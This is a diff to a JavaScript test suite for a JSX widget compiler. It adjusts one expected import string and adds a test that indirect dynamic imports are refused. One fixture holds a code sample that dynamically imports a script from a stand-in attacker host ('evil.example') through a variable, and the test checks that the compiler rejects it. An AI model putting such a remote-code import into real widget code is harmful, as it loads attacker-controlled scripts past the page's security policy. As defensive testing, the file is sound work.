@@ -88,8 +88,9 @@ describe("generative ui @jsx compilation", () => {
     expect(out.code).toContain("React.createElement");
     expect(out.code).not.toContain("<button");
     // ESM is the widget module format: imports/exports are preserved and
-    // resolved by the document's import map.
-    expect(out.code).toContain('import { useState } from "react"');
+    // resolved by the document's import map. (Output is astring-normalized:
+    // `import {useState} from "react";`.)
+    expect(out.code).toContain('import {useState} from "react"');
     expect(out.code).toContain("export default function App");
   });
 
@@ -110,6 +111,23 @@ describe("generative ui @jsx compilation", () => {
     // that one CDN).
     const esm = compileJsxModule('export default function App() { import("https://esm.sh/x@1"); return <div/>; }');
     expect(esm.ok).toBe(true);
+  });
+
+  test("dynamic imports must use a literal allowlisted specifier", () => {
+    // A regex cannot see what a variable holds, so indirect dynamic imports
+    // are refused outright — the widget CSP admits only the import-map libs
+    // and https://esm.sh/.
+    const indirect = compileJsxModule(
+      'const u = "https://evil.example/x.js"; export default function App() { import(u); return <div/>; }',
+    );
+    expect(indirect.ok).toBe(false);
+    if (indirect.ok) return;
+    expect(indirect.error).toContain("dynamic import specifier must be a literal string");
+    // A template literal is just as unpinned.
+    const tpl = compileJsxModule(
+      'const u = "x"; export default function App() { import(`https://esm.sh/${u}`); return <div/>; }',
+    );
+    expect(tpl.ok).toBe(false);
   });
 
   test("buildJsxModuleBody appends the auto-mount and never leaks script closers", () => {
